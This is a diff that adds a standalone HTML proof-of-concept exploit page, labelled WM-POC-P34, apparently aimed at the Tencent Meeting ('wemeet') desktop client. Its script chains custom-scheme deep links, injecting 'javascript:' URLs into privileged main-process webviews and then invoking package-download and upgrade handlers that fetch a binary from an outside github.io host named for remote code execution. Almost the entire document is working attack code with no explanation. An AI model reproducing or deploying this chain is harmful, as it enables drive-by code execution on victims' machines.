@@ -1,0 +1,25 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P34</h1>
+<script>
+document.title='P34L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var bin='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var jsInner="javascript:(function(){document.title='P34MP:'+location.host;function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}fr('wemeet://page/package_download?url="+bin+"');setTimeout(function(){fr('wemeet://page/premeeting/schedule_plugin_download?url="+bin+"')},500);setTimeout(function(){fr('wemeet://page/upgrade_app?url="+bin+"')},1000)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+/* MAIN process WVs: javascript: as first url, then iframe native schemes */
+setTimeout(function(){ frame('wemeet://page/operating_activities/main_process_webview?url='+encodeURIComponent(jsInner),'P34L-OP'); }, 800);
+setTimeout(function(){ frame('wemeet://page/pay/main_process_webview?url='+encodeURIComponent(jsInner),'P34L-PAY'); }, 4000);
+setTimeout(function(){ frame('wemeet://page/yuanbao_ai_assistant/ai_assistant_common?url='+encodeURIComponent(jsInner),'P34L-YB'); }, 7500);
+/* also official ToolBox inject → MAIN process from official doc */
+var jsTb="javascript:(function(){document.title='P34INJ:'+location.host;function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}fr('wemeet://page/operating_activities/main_process_webview?url="+encodeURIComponent(official)+"');setTimeout(function(){fr('wemeet://page/operating_activities/main_process_webview?url="+encodeURIComponent(jsInner)+"')},2500)})()";
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P34L-OFFICIAL'); }, 11000);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(jsTb),'P34L-JSINJ'); }, 20000);
+setTimeout(function(){ document.title='P34L-DONE'; }, 28000);
+</script>
+</body></html>
